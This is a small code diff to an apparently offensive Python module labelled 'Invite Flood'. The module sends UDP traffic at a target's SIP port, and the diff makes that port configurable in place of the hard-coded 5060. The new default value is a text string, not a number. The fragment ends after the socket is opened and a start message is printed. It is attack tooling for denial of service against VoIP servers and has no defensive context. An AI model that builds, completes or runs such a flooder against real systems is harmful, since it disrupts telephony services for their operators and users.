@@ -1,13 +1,15 @@
 import random
+import socket
 
 REQUIRED_OPTIONS = {
-        "IP": ""
+        "IP": "",
+        "PORT": "standar port 5060"
 }
 
 def execute(options):
 
     ip = options.get("IP")
-    port = 5060
+    port = options.get("PORT")
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     print(f"[*] Starting Invite Flood on {ip}...")
